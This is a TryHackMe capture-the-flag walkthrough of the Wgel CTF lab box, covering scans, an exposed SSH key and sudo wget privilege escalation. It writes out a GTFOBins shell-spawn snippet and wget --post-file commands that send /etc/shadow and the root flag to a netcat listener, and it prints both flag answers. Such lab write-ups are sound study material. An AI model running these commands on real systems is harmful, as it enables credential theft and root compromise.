## Wgel CTF - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/wgelctf)

**Have fun with this easy box.**

**IP: 10.10.82.183**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap, Gobuster<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap and Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.82.183
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
  |   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
  |_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.82.183 -w /usr/share/wordlists/dirb/common.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.htaccess            (Status: 403) [Size: 277]
  /.hta                 (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /index.html           (Status: 200) [Size: 11374]
  /server-status        (Status: 403) [Size: 277]
  /sitemap              (Status: 301) [Size: 314] [--> http://10.10.82.183/sitemap/]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```

  ```
  gobuster dir -u http://10.10.82.183/sitemap -w /usr/share/wordlists/dirb/common.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 277]
  /.htaccess            (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /.ssh                 (Status: 301) [Size: 319] [--> http://10.10.82.183/sitemap/.ssh/]
  /css                  (Status: 301) [Size: 318] [--> http://10.10.82.183/sitemap/css/]
  /fonts                (Status: 301) [Size: 320] [--> http://10.10.82.183/sitemap/fonts/]
  /images               (Status: 301) [Size: 321] [--> http://10.10.82.183/sitemap/images/]
  /index.html           (Status: 200) [Size: 21080]
  /js                   (Status: 301) [Size: 317] [--> http://10.10.82.183/sitemap/js/]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- While waiting for scanners to finish, I was exploring the web app and found `Jessie` as potential username. It's in the source code of main page.

  ```
   <!-- Jessie don't forget to udate the webiste -->
          </pre>
          <ul>
                        <li>
                           <tt>apache2.conf</tt> is the main configuration
                           file. It puts the pieces together by including all remaining configuration
                           files when starting up the web server.
  ```
  
- When gobuster for `/sitemap` finished, I went to `http://10.10.82.183/sitemap/.ssh` and you already know what I got there.

  ```
  -----BEGIN RSA PRIVATE KEY-----
  ..............................
  ..............................
  ..............................
  ..............................
  ..............................
  ..............................
  -----END RSA PRIVATE KEY-----
  ```
  
---

## ⚙️ Gaining Access

- Cool, since I have username and `id_rsa` I tried logging with SSH with those credentials.

  ```
  chmod 400 id_rsa
  ssh -i id_rsa jessie@10.10.82.183
  Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
  
   * Documentation:  https://help.ubuntu.com
   * Management:     https://landscape.canonical.com
   * Support:        https://ubuntu.com/advantage
  
  
  8 packages can be updated.
  8 updates are security updates.
  
  jessie@CorpOne:~$ whoami
  jessie
  ```
  
- Awesome, it worked, let's get those flags!

---

## 🧍 User Privilege Escalation

- You already know the drill.

  ```
  jessie@CorpOne:~$ cd Documents
  jessie@CorpOne:~/Documents$ ls
  user_flag.txt
  
  jessie@CorpOne:~/Documents$ cat user_flag.txt 
  057c67131c3d5e42dd5cd3075b198ff6
  ```
  
- Moving to root flag.

---

## 👑 Root Privilege Escalation

- I found a way to root immediately with `sudo -l`.

  ```
  sudo -l
  Matching Defaults entries for jessie on CorpOne:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User jessie may run the following commands on CorpOne:
      (ALL : ALL) ALL
      (root) NOPASSWD: /usr/bin/wget
  ```
  
- So now, I found exploit on `GTFOBins` for `wget` but unfortunately it didn't worked.

  ```
  TF=$(mktemp)
  chmod +x $TF
  echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
  sudo wget --use-askpass=$TF 0
  ```
  
- Then I switched to another exploitation. Since I can get files as root, I tried downloading `/etc/shadow` to my Kali machine since I could already read `/etc/passwd` as Jessie. Start a listener and run `wget` with sudo from target machine.

  ```
  jessie@CorpOne:~$ cat /etc/shadow
  cat: /etc/shadow: Permission denied

  #Kali
  sudo nc -lnvp 4444

  #Target
  sudo wget --post-file=/etc/shadow [YOUR-THM-IP]:4444

  #Kali
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.82.183] 49910
  POST / HTTP/1.1
  User-Agent: Wget/1.17.1 (linux-gnu)
  Accept: */*
  Accept-Encoding: identity
  Host: [YOUR-THM-IP]:4444
  Connection: Keep-Alive
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 1273
  
  root:!:18195:0:99999:7:::
  daemon:*:17953:0:99999:7:::
  bin:*:17953:0:99999:7:::
  sys:*:17953:0:99999:7:::
  sync:*:17953:0:99999:7:::
  games:*:17953:0:99999:7:::
  man:*:17953:0:99999:7:::
  lp:*:17953:0:99999:7:::
  mail:*:17953:0:99999:7:::
  news:*:17953:0:99999:7:::
  uucp:*:17953:0:99999:7:::
  proxy:*:17953:0:99999:7:::
  www-data:*:17953:0:99999:7:::
  backup:*:17953:0:99999:7:::
  list:*:17953:0:99999:7:::
  irc:*:17953:0:99999:7:::
  gnats:*:17953:0:99999:7:::
  .
  .
  .
  .
  ```

- GOTEM! Now let's do the same thing but with root flag.

  ```
  #Kali
  nc -lvnp 4444

  #Target
  sudo wget --post-file=/root/root_flag.txt [YOUR-THM-IP]:4444

  #Kali
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.82.183] 49918
  POST / HTTP/1.1
  User-Agent: Wget/1.17.1 (linux-gnu)
  Accept: */*
  Accept-Encoding: identity
  Host: [YOUR-THM-IP]:4444
  Connection: Keep-Alive
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 33
  
  b1b968b37519ad1daa6408188649263d
  ```

- That's all folks, see ya in the next one!

---

## 🏁 Flags

- **User Flag**: `057c67131c3d5e42dd5cd3075b198ff6`
- **Root Flag**: `b1b968b37519ad1daa6408188649263d`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding right sudo exploit.`

- What did I learn?
  `Just sharpening my skills.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
